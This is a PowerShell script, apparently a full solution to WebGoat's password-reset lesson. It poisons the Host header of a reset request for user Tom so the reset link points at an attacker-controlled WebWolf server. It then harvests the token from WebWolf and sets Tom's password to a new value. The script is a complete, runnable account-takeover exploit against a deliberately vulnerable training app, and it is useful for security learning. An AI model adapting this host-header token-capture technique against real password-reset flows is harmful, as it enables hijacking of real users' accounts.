# Password Reset Link Hijacking - COMPLETE SOLUTION
# Updated for remote WebWolf server

$webGoatBase = "http://192.168.254.112:8001"
$webWolfBase = "http://192.168.254.112:8002"
$webWolfHost = "192.168.254.112:8002"  # This will be used in Host header

Write-Host "======================================================================" -ForegroundColor Cyan
Write-Host "PASSWORD RESET LINK HIJACKING - COMPLETE ATTACK" -ForegroundColor Cyan
Write-Host "======================================================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "Configuration:" -ForegroundColor Yellow
Write-Host "  WebGoat: $webGoatBase" -ForegroundColor Gray
Write-Host "  WebWolf: $webWolfBase" -ForegroundColor Gray
Write-Host "  Host Header: $webWolfHost" -ForegroundColor Gray
Write-Host ""

# IMPORTANT: This script requires you to have an active WebGoat session
Write-Host "[!] PREREQUISITES:" -ForegroundColor Yellow
Write-Host "    1. You must be logged into WebGoat in your browser" -ForegroundColor Gray
Write-Host "    2. Copy your JSESSIONID cookie from browser" -ForegroundColor Gray
Write-Host "    3. Paste it when prompted below" -ForegroundColor Gray
Write-Host ""

$sessionCookie = Read-Host "Enter your JSESSIONID cookie (or press Enter to try without it)"
Write-Host ""

$headers = @{
    "Host" = $webWolfHost
    "Content-Type" = "application/x-www-form-urlencoded"
}

if ($sessionCookie) {
    $headers["Cookie"] = "JSESSIONID=$sessionCookie"
}

# Step 1: Request password reset with modified Host header
Write-Host "======================================================================" -ForegroundColor Cyan
Write-Host "[STEP 1] Requesting Password Reset for Tom" -ForegroundColor Cyan
Write-Host "======================================================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "Target Email: tom@webgoat-cloud.org" -ForegroundColor Yellow
Write-Host "Attack: Modifying Host header to point to WebWolf" -ForegroundColor Yellow
Write-Host "  Original Host: localhost:8080" -ForegroundColor Gray
Write-Host "  Modified Host: $webWolfHost" -ForegroundColor Green
Write-Host ""
Write-Host "When Tom clicks the reset link, it will be sent to YOUR WebWolf server!" -ForegroundColor Yellow
Write-Host ""

try {
    $resetResponse = Invoke-WebRequest -Uri "$webGoatBase/WebGoat/PasswordReset/reset/reset-password" `
        -Method POST `
        -Headers $headers `
        -Body "email=tom@webgoat-cloud.org" `
        -UseBasicParsing
    
    Write-Host "[SUCCESS] Password reset request sent!" -ForegroundColor Green
    Write-Host "  HTTP Status: $($resetResponse.StatusCode)" -ForegroundColor Green
    Write-Host ""
    
    # Try to parse response
    try {
        $responseData = $resetResponse.Content | ConvertFrom-Json
        Write-Host "  Server Response:" -ForegroundColor Gray
        Write-Host ($responseData | ConvertTo-Json -Depth 5) -ForegroundColor Gray
        Write-Host ""
    } catch {
        Write-Host "  Response (text): $($resetResponse.Content)" -ForegroundColor Gray
        Write-Host ""
    }
    
} catch {
    Write-Host "[ERROR] Failed to send reset request!" -ForegroundColor Red
    Write-Host "  Error: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host ""
    Write-Host "[TIP] You may need to:" -ForegroundColor Yellow
    Write-Host "  1. Get your JSESSIONID cookie from browser" -ForegroundColor Gray
    Write-Host "  2. Make sure you're on the Password Reset lesson page" -ForegroundColor Gray
    Write-Host ""
    exit
}

# Step 2: Wait for Tom to click
Write-Host "======================================================================" -ForegroundColor Cyan
Write-Host "[STEP 2] Waiting for Tom to Click the Link" -ForegroundColor Cyan
Write-Host "======================================================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "According to the challenge:" -ForegroundColor Yellow
Write-Host "  'Tom is quick to act when it comes to his password.'" -ForegroundColor Gray
Write-Host "  'He always resets it immediately after receiving the email.'" -ForegroundColor Gray
Write-Host ""
Write-Host "Waiting 5 seconds for Tom to click..." -ForegroundColor Yellow

for ($i = 5; $i -gt 0; $i--) {
    Write-Host "  $i..." -NoNewline
    Start-Sleep -Seconds 1
}
Write-Host " Done!" -ForegroundColor Green
Write-Host ""

# Step 3: Check WebWolf for token
Write-Host "======================================================================" -ForegroundColor Cyan
Write-Host "[STEP 3] Retrieving Token from WebWolf" -ForegroundColor Cyan
Write-Host "======================================================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "Checking WebWolf for captured reset token..." -ForegroundColor Yellow
Write-Host ""

$capturedToken = $null

try {
    # Try different WebWolf endpoints
    $endpoints = @(
        "$webWolfBase/WebWolf/requests",
        "$webWolfBase/requests",
        "$webWolfBase/WebWolf/incoming-requests"
    )
    
    foreach ($endpoint in $endpoints) {
        Write-Host "  Trying: $endpoint" -ForegroundColor Gray
        
        try {
            $webWolfResponse = Invoke-WebRequest -Uri $endpoint `
                -Method GET `
                -UseBasicParsing `
                -TimeoutSec 5
            
            # Look for token in various formats
            if ($webWolfResponse.Content -match 'token=([a-zA-Z0-9\-]+)') {
                $capturedToken = $matches[1]
                Write-Host "    [FOUND] Token in response!" -ForegroundColor Green
                break
            }
            
            # Also check for JSON format
            try {
                $jsonData = $webWolfResponse.Content | ConvertFrom-Json
                if ($jsonData.token) {
                    $capturedToken = $jsonData.token
                    Write-Host "    [FOUND] Token in JSON!" -ForegroundColor Green
                    break
                }
            } catch {}
            
        } catch {
            Write-Host "    [SKIP] Endpoint not accessible" -ForegroundColor Gray
        }
    }
    
} catch {
    Write-Host "[WARNING] Could not auto-retrieve token from WebWolf" -ForegroundColor Yellow
    Write-Host "  Error: $($_.Exception.Message)" -ForegroundColor Gray
}

Write-Host ""

if (-not $capturedToken) {
    Write-Host "======================================================================" -ForegroundColor Yellow
    Write-Host "[MANUAL STEP REQUIRED]" -ForegroundColor Yellow
    Write-Host "======================================================================" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "Could not automatically retrieve the token." -ForegroundColor Yellow
    Write-Host ""
    Write-Host "Please do the following:" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "1. Open WebWolf in your browser:" -ForegroundColor White
    Write-Host "   $webWolfBase" -ForegroundColor Green
    Write-Host ""
    Write-Host "2. Login with your WebGoat credentials" -ForegroundColor White
    Write-Host ""
    Write-Host "3. Go to one of these sections:" -ForegroundColor White
    Write-Host "   - Incoming Requests" -ForegroundColor Gray
    Write-Host "   - HTTP Requests" -ForegroundColor Gray
    Write-Host "   - Requests" -ForegroundColor Gray
    Write-Host ""
    Write-Host "4. Look for a request to /PasswordReset/reset/... with a token parameter" -ForegroundColor White
    Write-Host ""
    Write-Host "5. Copy the token value (long string like: 4a8b3c9d-1e2f-3g4h-5i6j-7k8l9m0n)" -ForegroundColor White
    Write-Host ""
    
    $capturedToken = Read-Host "Paste the token here"
    Write-Host ""
}

if ($capturedToken) {
    Write-Host "[SUCCESS] Token Retrieved!" -ForegroundColor Green
    Write-Host "  Token: $capturedToken" -ForegroundColor Green
    Write-Host ""
    
    # Step 4: Reset Tom's password
    Write-Host "======================================================================" -ForegroundColor Cyan
    Write-Host "[STEP 4] Resetting Tom's Password" -ForegroundColor Cyan
    Write-Host "======================================================================" -ForegroundColor Cyan
    Write-Host ""
    
    $newPassword = "HackedPassword123!"
    Write-Host "New Password: $newPassword" -ForegroundColor Yellow
    Write-Host ""
    
    try {
        # Remove Host header for password reset (use normal request)
        $resetHeaders = @{
            "Content-Type" = "application/x-www-form-urlencoded"
        }
        
        if ($sessionCookie) {
            $resetHeaders["Cookie"] = "JSESSIONID=$sessionCookie"
        }
        
        $resetPasswordResponse = Invoke-WebRequest -Uri "$webGoatBase/WebGoat/PasswordReset/reset/reset-password/$capturedToken" `
            -Method POST `
            -Headers $resetHeaders `
            -Body "newPassword=$newPassword" `
            -UseBasicParsing
        
        Write-Host "[SUCCESS] Password Reset Complete!" -ForegroundColor Green
        Write-Host "  HTTP Status: $($resetPasswordResponse.StatusCode)" -ForegroundColor Green
        Write-Host ""
        
        try {
            $responseData = $resetPasswordResponse.Content | ConvertFrom-Json
            Write-Host "  Server Response:" -ForegroundColor Gray
            Write-Host ($responseData | ConvertTo-Json -Depth 5) -ForegroundColor Gray
            Write-Host ""
        } catch {
            Write-Host "  Response: $($resetPasswordResponse.Content)" -ForegroundColor Gray
            Write-Host ""
        }
        
        Write-Host "======================================================================" -ForegroundColor Green
        Write-Host "ATTACK SUCCESSFUL!" -ForegroundColor Green
        Write-Host "======================================================================" -ForegroundColor Green
        Write-Host ""
        Write-Host "Tom's password has been changed!" -ForegroundColor Green
        Write-Host ""
        Write-Host "Login Credentials:" -ForegroundColor Cyan
        Write-Host "  Username: tom" -ForegroundColor White
        Write-Host "  Password: $newPassword" -ForegroundColor White
        Write-Host ""
        Write-Host "Now go to the login page and login as Tom to complete the challenge!" -ForegroundColor Yellow
        Write-Host ""
        
    } catch {
        Write-Host "[ERROR] Failed to reset password!" -ForegroundColor Red
        Write-Host "  Error: $($_.Exception.Message)" -ForegroundColor Red
        Write-Host ""
    }
    
} else {
    Write-Host "[FAILED] No token available. Cannot proceed." -ForegroundColor Red
    Write-Host ""
}

Write-Host "======================================================================" -ForegroundColor Cyan
Write-Host "Script Complete" -ForegroundColor Cyan
Write-Host "======================================================================" -ForegroundColor Cyan
